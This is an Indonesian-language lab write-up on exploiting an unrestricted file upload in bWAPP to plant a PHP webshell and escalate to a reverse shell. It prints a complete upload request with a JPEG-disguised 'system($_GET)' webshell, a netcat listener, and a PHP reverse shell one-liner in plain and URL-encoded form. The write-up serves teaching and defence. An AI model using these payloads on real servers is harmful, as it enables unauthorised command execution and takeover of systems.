# Unrestricted File Upload: From Webshell to Reverse Shell Access

[🇬🇧 Read in English](webshell-reverse-shell-en.md)

# Apa itu Webshell?
Webshell adalah file/script yang digunakan attacker atau pentester untuk menjalankan kode atau perintah pada server web, umumnya melalui eksploitasi file upload, dan dapat digunakan sebagai sarana persistence.

Kerentanannya dapat berasal dari unrestricted file upload, validasi ekstensi/MIME type yang lemah, path traversal, file processing, permission, hingga misconfiguration web server yang memungkinkan code execution atau RCE.

<details>
<summary>Webshell dapat dikategorikan berdasarkan fungsi dan implementasinya, seperti:</summary>

1. Command Webshell
2. Code Execution Webshell
3. File Manager Webshell
4. Database Webshell
5. Database-backed Webshell
6. Minimal / One-liner Webshell
7. Single-file Webshell
8. Multi-file Webshell
9. Custom Webshell
10. Reverse Shell Webshell
11. Web-based Terminal
12. Upload / Dropper Webshell
13. File Upload Webshell
14. File Inclusion Webshell
15. Multi-function Webshell
16. Memory-based Webshell
17. In-memory Webshell
18. Fileless Webshell
19. Obfuscated Webshell
20. Encrypted Webshell
21. Authenticated Webshell
22. Password-protected Webshell
23. Stealth Webshell
24. Polymorphic Webshell
25. Modular Webshell
26. Proxy / Tunnel Webshell
27. C2-integrated Webshell
28. Webshell Loader / Stager
29. Webshell Backdoor
30. Webshell Framework
31. Eval-based Webshell
32. Log-based Webshell
33. Template Injection Webshell
34. Deserialization Webshell
35. Plugin / Module-based Webshell
36. Serverless Webshell
37. Container-based Webshell
38. Server Configuration Webshell
39. Web Server Module Webshell
40. Living-off-the-Land Webshell
41. Webshell via Database Function
42. JavaScript Webshell
43. PHP Webshell
44. ASP Webshell
45. ASP.NET Webshell
46. JSP Webshell
47. Python Webshell
48. Perl Webshell
49. Node.js Webshell
50. CGI-based Webshell
</details>

<details>
<summary>Lintas stack yang bisa dimanfaatkan oleh penyerang dengan metode webshell seperti:</summary>

1. PHP — PHP-FPM, Apache, Nginx
2. PHP alternatives / runtimes — HHVM, FrankenPHP
3. ASP / Classic ASP — IIS
4. ASP.NET / C# — IIS, Kestrel
5. ASP.NET Core — Kestrel, IIS, Nginx, Apache
6. F# — ASP.NET, Giraffe
7. JSP / Java — Tomcat, Jetty, Spring
8. Java application servers — WildFly, JBoss, GlassFish, Payara, WebLogic, WebSphere
9. Kotlin — Ktor, Spring
10. Scala — Play Framework, Akka HTTP
11. Groovy — Grails
12. Clojure — Ring
13. Node.js / JavaScript — Express, Fastify, Node.js
14. Deno — Deno runtime
15. Bun — Bun runtime
16. Python — Flask, Django, FastAPI, WSGI
17. Ruby — Rails, Rack
18. Perl — CGI, PSGI/Plack
19. Go — net/http, Gin, Echo, Fiber
20. ColdFusion / CFML — Adobe ColdFusion, Lucee
21. Lua — OpenResty, Lua-based web servers
22. Rust — Actix Web, Axum, Rocket
23. Erlang — Cowboy
24. Elixir — Phoenix
25. Haskell — WAI/Warp
26. C / C++ — CGI, FastCGI, embedded web servers
27. Tcl — CGI / Tcl web servers
28. R — Shiny / R web applications
29. Dart — Dart server frameworks
30. Crystal — Kemal / Crystal HTTP
31. Swift — Vapor
32. WebAssembly — WASI/server-side WebAssembly runtimes
33. Clojure — Ring
34. OCaml — Dream, Cohttp
35. Nim — Jester, Prologue
36. Zig — custom HTTP servers / frameworks
37. V / Vlang — vweb
38. Smalltalk — Seaside
39. Prolog — SWI-Prolog HTTP
40. Lisp / Common Lisp — Hunchentoot
41. Scheme — web frameworks / CGI
42. Julia — Genie.jl, HTTP.jl
43. MATLAB — MATLAB Web App Server
44. SAS — SAS web/application environments
45. COBOL — CGI / enterprise application environments
46. Fortran — CGI / custom HTTP integrations
47. Server-side templating engines — Jinja, Twig, Blade, FreeMarker, Thymeleaf, etc.
48. CGI — generic server-side execution
49. FastCGI — generic server-side execution
50. Server-side plugins/modules — Apache, Nginx, IIS, application-server modules
51. Custom / embedded HTTP servers — application-specific runtimes
52. Legacy / proprietary application servers — vendor-specific server-side runtimes
</details>
---

Pemanfaatan webshell tidak hanya bergantung pada bahasa pemrograman, tetapi juga pada **web server, runtime, framework, konfigurasi permission, mekanisme upload, dan bagaimana aplikasi menangani serta mengeksekusi file**.

# Apa itu Reverse Shell?

Reverse Shell adalah teknik di mana **mesin target membuat koneksi keluar (outbound connection)** menuju mesin milik attacker atau pentester sehingga shell interaktif dapat diperoleh dari jarak jauh.

Berbeda dengan **Bind Shell** yang membuka port pada sisi target, Reverse Shell memanfaatkan koneksi keluar sehingga sering kali lebih mudah melewati firewall yang hanya mengizinkan trafik outbound.

Perlu dipahami bahwa **Reverse Shell bukanlah sebuah kerentanan**, melainkan **payload** yang dijalankan setelah penyerang berhasil memperoleh kemampuan menjalankan perintah pada sistem target.

Reverse Shell hanya dapat dijalankan apabila penyerang telah memperoleh **Command Execution** pada server.

Beberapa kerentanan yang umum menjadi titik masuk antara lain:

- Command Injection
- Remote Code Execution (RCE)
- Unsafe File Upload
- Insecure Deserialization
- Web Shell
- Local Privilege Escalation

# Root Cause

Pada demonstrasi kali ini, **Webshell** menjadi akar penyebab (*root cause*) yang memungkinkan file ter-upload dan juga eskalasi revershell sebagai area yang pijakan yang selanjutnya.

Alur serangan secara sederhana dapat digambarkan sebagai berikut.

```text
Unsafe File Upload
        │
        ▼
   Webshell Upload
        │
        ▼
  Webshell Execution
        │
        ▼
  Command Execution
        │
        ▼
Reverse Shell Payload
        │
        ▼
 Outbound Connection
        │
        ▼
  Interactive Shell
```

---

# Topologi Lab

Pada demonstrasi ini saya menggunakan lingkungan lab sederhana berbasis VMware.

| Peran | Keterangan | IP Address |
| :--- | :--- | :--- |
| **Attacker** | Kali Linux | `10.10.10.149` |
| **Target Web** | Ubuntu Server (Mutillidae II) | `10.10.10.2` |

```text
+-------------------------------------------------+
|              LAB - 10.10.10.0/24                |
|                                                 |
|  +---------------+      +-------------------+   |
|  |  Kali Linux   |      |   Ubuntu Server   |   |
|  |  [ATTACKER]   |      |   [TARGET WEB]    |   |
|  |  Listener     | <--- |   Webshell        |   |
|  | 10.10.10.149  |      |   10.10.10.2      |   |
|  |   Port 9001   |      |   bWAPP           |   |
|  +---------------+      +-------------------+   |
|          ^                      |               |
|          |                      |               |
|          +--- Reverse Shell ----+               |
+-------------------------------------------------+
```

---

# Cara memasukkan Webshell pada Target.

Disini perlu diketahui titik masuk-nya terlebih dahulu. Seperti menemukan celah dan kesalahan apa yang bisa memicu file yang bisa dijalankan di sisi server.

Disini saya mem-praktikan teknik tersebut di aplikasi bWAPP.

# Menentukan Titik Masuk

Disini persyaratan yang harus: 

- mempunyai feature file upload

![Feature file upload](feature-file-upload.png)

- file tersebut terupload dilokasi mana

![Lokasi](lokasi-file-upload.png)

# Pengujian file upload

```bash
POST /unrestricted_file_upload.php HTTP/1.1
Host: bwapp.owasp.hacking
Cookie: security_level=0; PHPSESSID=74m5811lvb2m537p414doo9tvh
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary892e890fa227d2e5177f855b0f0f49f6
Content-Length: 22067
Origin: https://bwapp.owasp.hacking
Referer: https://bwapp.owasp.hacking/unrestricted_file_upload.php

Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

------geckoformboundary892e890fa227d2e5177f855b0f0f49f6

Content-Disposition: form-data; name="file"; filename="dewajudi.php"

Content-Type: image/jpeg

ÿØÿà

<?php system($_GET['cmd']); ?>
```

![Pengujian](pengujian-file-upload.png)


# Menjalankan Listener

Banyak variasi yang bisa di coba seperti menggunakan resource Webshell custom yang ada di internet, lalu juga secara langsung banyak berfokus kepada point tujuan utama yaitu Remote Control Access terminal.

Pentester dan attacker mempunyai variasi berbeda dalam menjalankan setiap teknik. Disini saya langsung mengirimkan Listener untuk memanggil Reverse shell 

# Tambahan

Waktu melakukan spray payload pastikan melakukan encode URL pada code.

Cara ini bukan untuk aman dari deteksi tapi lebih ke efisien jika kita melakukan inputan meminta bind langsung server akan menolak memberikan respone tidak di ketahui maupun tidak diterima / blokir ini untuk pembuktian apakah server dapat melakukan bind.


```bash
root@server01:/var/www/hack/mutillidae/src# php -r '$s = fsockopen("10.10.10.149", 3001, $errno, $errstr, 3); var_dump($s, $errno, $errstr);'
resource(4) of type (stream)
int(0)
string(0) ""
root@server01:/var/www/hack/mutillidae/src#
```

```bash
┌──(moon㉿kali)-[~]
└─$ nc -lvnp 3001
listening on [any] 3001 ...
connect to [10.10.10.149] from (UNKNOWN) [10.10.10.2] 44418
```

# Pengujian reverse shell

Payload perlu di encode URL. Melakukan Reverse shell itu sendiri adalah meningkatkan foothold akses.

```bash
php -r '$sock=fsockopen("10.10.10.149",3001);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```url
GET /images/dewajudi.php?cmd=php+-r+'$sock%3dfsockopen("10.10.10.149",3001)%3bexec("/bin/sh+-i+<%263+>%263+2>%263")%3b'
```

# Hasil

Setelah itu kita berhasil mendapatkan akses terminal shell pada mesin melalui akses webshell dan juga foothold revershell.

![Reverse shell](hasil.png)


# Impact

Webshell yang berhasil dieksekusi dapat memberikan kemampuan **Command Execution** dalam konteks user web server dan menjadi foothold untuk aktivitas lanjutan.

# Kesimpulan

Pada pengujian ini saya dapat mempelajari bagaimana **Unrestricted File Upload** dapat digunakan untuk melakukan Webshell dan memperoleh **Command Execution**, kemudian dilanjutkan dengan Reverse Shell melalui koneksi outbound.

Eksperimen ini menunjukkan bahwa pertahanan perlu dilakukan pada beberapa layer, mulai dari **file upload, file execution, permission, process, hingga network monitoring**.

# Referensi

- **OWASP – File Upload Cheat Sheet**  
  https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

- **OWASP – Unrestricted File Upload**  
  https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload

- **MITRE ATT&CK – Web Shell (T1505.003)**  
  https://attack.mitre.org/techniques/T1505/003/

- **MITRE ATT&CK – Command and Scripting Interpreter (T1059)**  
  https://attack.mitre.org/techniques/T1059/

- **PayloadsAllTheThings – Reverse Shell Cheat Sheet**  
  https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/

---

Terima kasih.
